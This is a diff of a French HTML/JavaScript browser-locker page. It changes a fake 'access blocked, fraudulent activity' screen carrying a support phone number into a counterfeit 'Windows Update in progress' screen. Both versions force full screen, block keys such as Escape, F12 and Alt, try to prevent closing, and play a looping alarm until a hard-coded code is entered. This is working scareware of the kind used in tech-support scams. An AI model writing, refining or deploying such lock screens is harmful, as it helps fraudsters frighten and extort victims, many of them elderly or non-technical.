@@ -2,93 +2,84 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🔒 Sécurité Système</title>
+    <title>🔒 Mise à jour Windows</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
             font-family: Arial, sans-serif;
-        }html, body {
-        width: 100%;
-        height: 100%;
-        background: black;
-        color: white;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        text-align: center;
-        overflow: hidden;
-        cursor: none;
-    }
-
-    .container {
-        background: red;
-        padding: 5%;
-        border-radius: 10px;
-        box-shadow: 0 0 10px white;
-        width: 80vw;
-        height: 80vh;
-        display: flex;
-        flex-direction: column;
-        justify-content: center;
-        align-items: center;
-    }
-
-    h1 {
-        font-size: 5vw;
-        margin-bottom: 2vh;
-    }
-
-    #alert-message {
-        font-size: 3vw;
-        margin-bottom: 3vh;
-    }
-
-    input {
-        padding: 1vh;
-        font-size: 3vw;
-        margin-bottom: 2vh;
-        text-align: center;
-        outline: none;
-        width: 50%;
-    }
-
-    button {
-        background: black;
-        color: white;
-        padding: 2vh 4vw;
-        font-size: 3vw;
-        cursor: pointer;
-    }
-
-    #error-message {
-        color: yellow;
-        font-size: 2vw;
-        margin-top: 2vh;
-    }
-</style>
-
+        }
+        html, body {
+            width: 100%;
+            height: 100%;
+            background: #0078D7;
+            color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            overflow: hidden;
+            cursor: none;
+        }
+        .container {
+            background: rgba(0, 0, 0, 0.8);
+            padding: 5%;
+            border-radius: 10px;
+            box-shadow: 0 0 10px white;
+            width: 60vw;
+            height: 50vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+        h1 {
+            font-size: 4vw;
+            margin-bottom: 2vh;
+        }
+        #alert-message {
+            font-size: 2vw;
+            margin-bottom: 3vh;
+        }
+        input {
+            padding: 1vh;
+            font-size: 2vw;
+            margin-bottom: 2vh;
+            text-align: center;
+            outline: none;
+            width: 50%;
+        }
+        button {
+            background: black;
+            color: white;
+            padding: 2vh 4vw;
+            font-size: 2vw;
+            cursor: pointer;
+        }
+        #error-message {
+            color: yellow;
+            font-size: 1.5vw;
+            margin-top: 2vh;
+        }
+    </style>
 </head>
 <body onload="startLockdown()">
     <div class="container">
-        <h1>🔴 ACCÈS BLOQUÉ 🔴</h1>
+        <h1>🔒 Mise à jour Windows en cours</h1>
         <p id="alert-message">
-            🚨 <b>SUSPICION D’ACTIVITÉ FRAUDULEUSE</b> 🚨<br>
-            Votre ordinateur est verrouillé pour des raisons de **sécurité**.<br>
-            Veuillez **entrer le code secret** pour déverrouiller.<br>
-            <b>☎ Assistance : +44 741 30 52 610</b>
+            🚨 Votre système est actuellement en mise à jour obligatoire 🚨<br>
+            Ne redémarrez pas votre ordinateur sous peine de perte de données.<br>
+            Pour continuer, veuillez entrer le code de validation.
         </p>
-        <input type="password" id="codeInput" placeholder="Entrez le code secret..." autofocus>
-        <button onclick="checkCode()">Déverrouiller</button>
+        <input type="password" id="codeInput" placeholder="Entrez le code de validation..." autofocus>
+        <button onclick="checkCode()">Valider</button>
         <p id="error-message"></p>
-    </div><script>
-    const SECRET_CODES = ["dakar", "2012", "1234"];
-    let attempts = 0;
-    const maxAttempts = 3;
-
-    function startLockdown() {
-        forceMaxResolution();
+    </div>
+    <script>
+        const SECRET_CODE = "windowsupdate123";
+        let attempts = 0;
+        const maxAttempts = 3;function startLockdown() {
         requestFullScreen();
         blockKeys();
         preventClose();
@@ -96,8 +87,8 @@
     }
 
     function checkCode() {
-        let inputCode = document.getElementById("codeInput").value.toLowerCase();
-        if (SECRET_CODES.includes(inputCode)) {
+        let inputCode = document.getElementById("codeInput").value;
+        if (inputCode === SECRET_CODE) {
             unlockSystem();
         } else {
             attempts++;
@@ -106,13 +97,6 @@
                 playAlarm();
             }
         }
-    }
-
-    function forceMaxResolution() {
-        document.documentElement.style.width = "100vw";
-        document.documentElement.style.height = "100vh";
-        document.body.style.width = "100vw";
-        document.body.style.height = "100vh";
     }
 
     function requestFullScreen() {
@@ -130,25 +114,22 @@
 
     function blockKeys() {
         document.addEventListener("keydown", function (event) {
-            let blockedKeys = ["Escape", "F11", "F5", "F12", "Tab", "Control", "Alt", "Meta", "Shift", "Delete"];
+            let blockedKeys = ["Escape", "F11", "F12", "Tab", "Control", "Alt", "Meta", "Shift", "Delete"];
             if (blockedKeys.includes(event.key)) {
                 event.preventDefault();
-            }
-            if (event.key === "Enter") {
-                checkCode();
             }
         });
     }
 
     function playAlarm() {
-        let audio = new Audio("https://freesound.org/data/previews/411/411091_5121236-lq.mp3");
+        let audio = new Audio("https://www.soundjay.com/button/beep-07.wav");
         audio.loop = true;
         audio.play();
     }
 
     function unlockSystem() {
         document.exitFullscreen();
-        document.body.innerHTML = "<h1 style='color: green;'>✅ Accès Rétabli</h1>";
+        document.body.innerHTML = "<h1 style='color: green;'>✅ Mise à jour terminée</h1>";
     }
 
     function preventClose() {
